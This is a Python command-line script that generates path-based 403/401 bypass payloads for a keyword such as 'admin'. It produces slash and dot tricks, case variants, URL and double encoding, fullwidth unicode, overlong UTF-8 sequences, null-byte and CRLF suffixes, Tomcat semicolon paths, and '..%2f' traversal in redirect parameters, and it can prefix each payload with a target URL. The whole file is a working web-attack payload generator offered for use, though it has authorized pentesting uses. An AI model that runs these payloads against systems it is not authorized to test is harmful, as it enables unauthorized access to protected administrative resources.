#!/usr/bin/env python3
"""
bypass403.py

Generates path-based 403/401 bypass payloads for a given keyword (e.g. "admin"),
covering slash tricks, case variation, extension appending, encoding tricks,
double-encoding, unicode homoglyphs, overlong UTF-8, and more.

Usage:
    python3 bypass403.py admin
    python3 bypass403.py admin --base-url https://target.com
    python3 bypass403.py admin --categories slashes,encoding
    python3 bypass403.py admin --custom "{w}//\\..//\\"
    python3 bypass403.py admin --ext json,php,html
    python3 bypass403.py admin -o payloads.txt
"""

import argparse
import sys

DEFAULT_EXTENSIONS = ["json", "css", "php", "html", "xml", "txt"]


def full_url_encode(word: str) -> str:
    return "".join(f"%{ord(c):02x}" for c in word)


def double_encode(word: str) -> str:
    # %XX -> %25XX  (re-encode the '%' of a single-char encoding)
    return "".join(f"%25{ord(c):02x}" for c in word)


def alt_case(word: str) -> str:
    return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(word))


def fullwidth(word: str) -> str:
    # maps ascii letters/digits to their unicode fullwidth counterparts
    out = []
    for c in word:
        if "a" <= c <= "z" or "A" <= c <= "Z" or "0" <= c <= "9":
            out.append(chr(ord(c) + 0xFEE0))
        else:
            out.append(c)
    return "".join(out)


def gen_slashes(w: str) -> list[str]:
    return [
        f"/{w}/",
        f"//{w}/",
        f"/{w}//",
        f"///{w}",
        f"/{w}/.",
        f"/./{w}/./",
        f"/{w}/..;/",
    ]


def gen_case(w: str) -> list[str]:
    return [
        f"/{w.upper()}",
        f"/{w.lower()}",
        f"/{alt_case(w)}",
    ]


def gen_extension(w: str, extensions: list[str]) -> list[str]:
    return [f"/{w}.{ext}" for ext in extensions]


def gen_suffix(w: str) -> list[str]:
    return [
        f"/{w}#",
        f"/{w}?",
        f"/{w}?foo=bar",
        f"/{w}?debug=true",
    ]


def gen_nullbyte_crlf(w: str) -> list[str]:
    return [
        f"/{w}%00",
        f"/{w}%0d%0a",
    ]


def gen_whitespace(w: str) -> list[str]:
    return [
        f"/{w}%20/",
        f"/{w}%09/",
    ]


def gen_urlencode(w: str) -> list[str]:
    payloads = [f"/{full_url_encode(w)}"]
    if len(w) >= 1:
        payloads.append(f"/%{ord(w[0]):02x}{w[1:]}")          # first char encoded
    if len(w) >= 2:
        payloads.append(f"/{w[:-1]}%{ord(w[-1]):02x}")        # last char encoded
    return payloads


def gen_doubleencode(w: str) -> list[str]:
    return [
        f"/{double_encode(w)}",
        f"/%25{full_url_encode(w)[1:]}",  # %25 followed by the rest of a full-encoded word
    ]


def gen_unicode(w: str) -> list[str]:
    return [
        f"/{fullwidth(w)}",
    ]


def gen_overlong_utf8(w: str) -> list[str]:
    return [
        f"/%c0%af{w}",
        f"/%c0%ae%c0%ae/{w}",
        f"/%c1%9c{w}",
    ]


def gen_dot_encode(w: str) -> list[str]:
    return [
        f"/{w}%2e/",
        f"/{w}%2e%2e/",
    ]


def gen_backslash(w: str) -> list[str]:
    return [
        f"/{w}%5c",
        f"/{w}\\",
        f"\\{w}",
    ]


def gen_double_encoded_space(w: str) -> list[str]:
    return [
        f"/{w}%2520",
    ]


def gen_tomcat(w: str) -> list[str]:
    return [
        f"/{w};.json",
        f"/{w};/",
        f"/{w}.;/",
    ]


def gen_redirect_param(w: str) -> list[str]:
    return [
        f"/{w}?redirect=%2f{w}",
        f"/{w}?path=..%2f..%2f{w}",
    ]


CATEGORIES = {
    "slashes": lambda w, ext: gen_slashes(w),
    "case": lambda w, ext: gen_case(w),
    "extension": lambda w, ext: gen_extension(w, ext),
    "suffix": lambda w, ext: gen_suffix(w),
    "nullbyte": lambda w, ext: gen_nullbyte_crlf(w),
    "whitespace": lambda w, ext: gen_whitespace(w),
    "encoding": lambda w, ext: gen_urlencode(w),
    "doubleencoding": lambda w, ext: gen_doubleencode(w),
    "unicode": lambda w, ext: gen_unicode(w),
    "overlong": lambda w, ext: gen_overlong_utf8(w),
    "dotencode": lambda w, ext: gen_dot_encode(w),
    "backslash": lambda w, ext: gen_backslash(w),
    "doublespace": lambda w, ext: gen_double_encoded_space(w),
    "tomcat": lambda w, ext: gen_tomcat(w),
    "redirect": lambda w, ext: gen_redirect_param(w),
}


def build_payloads(word: str, categories: list[str], extensions: list[str], custom_templates: list[str]) -> list[str]:
    payloads: list[str] = []

    for cat in categories:
        payloads += CATEGORIES[cat](word, extensions)

    for template in custom_templates:
        payloads.append(template.replace("{w}", word))

    return payloads


def main():
    parser = argparse.ArgumentParser(
        description="Generate path-based 403/401 bypass payloads for a keyword."
    )
    parser.add_argument("word", help="Keyword to build payloads from, e.g. 'admin'")
    parser.add_argument(
        "--base-url", metavar="URL",
        help="Prefix every payload with this base URL (e.g. https://target.com)"
    )
    parser.add_argument(
        "--categories", metavar="LIST",
        help=f"Comma-separated list of categories to use (default: all). "
             f"Available: {','.join(CATEGORIES.keys())}"
    )
    parser.add_argument(
        "--ext", metavar="LIST",
        help=f"Comma-separated list of extensions for the 'extension' category "
             f"(default: {','.join(DEFAULT_EXTENSIONS)})"
    )
    parser.add_argument(
        "--custom", action="append", default=[], metavar="TEMPLATE",
        help="Custom payload template using {w} as the keyword placeholder. "
             "Repeatable, e.g. --custom \"{w}//\\..//\\\" --custom \"..;/{w}\""
    )
    parser.add_argument(
        "-o", "--output", metavar="FILE",
        help="Save the generated payloads to FILE (in addition to printing them)"
    )

    args = parser.parse_args()

    if args.categories:
        selected = [c.strip() for c in args.categories.split(",") if c.strip()]
        unknown = [c for c in selected if c not in CATEGORIES]
        if unknown:
            print(f"[!] Unknown categor{'y' if len(unknown) == 1 else 'ies'}: {', '.join(unknown)}", file=sys.stderr)
            print(f"[!] Available: {', '.join(CATEGORIES.keys())}", file=sys.stderr)
            sys.exit(1)
    else:
        selected = list(CATEGORIES.keys())

    extensions = [e.strip() for e in args.ext.split(",")] if args.ext else DEFAULT_EXTENSIONS

    payloads = build_payloads(args.word, selected, extensions, args.custom)

    if args.base_url:
        base = args.base_url.rstrip("/")
        payloads = [base + p for p in payloads]

    output_text = "\n".join(payloads)
    print(output_text)

    print(f"\n[*] {len(payloads)} payload(s) generated", file=sys.stderr)

    if args.output:
        with open(args.output, "w") as f:
            f.write(output_text + ("\n" if payloads else ""))
        print(f"[*] Saved to {args.output}", file=sys.stderr)


if __name__ == "__main__":
    main()
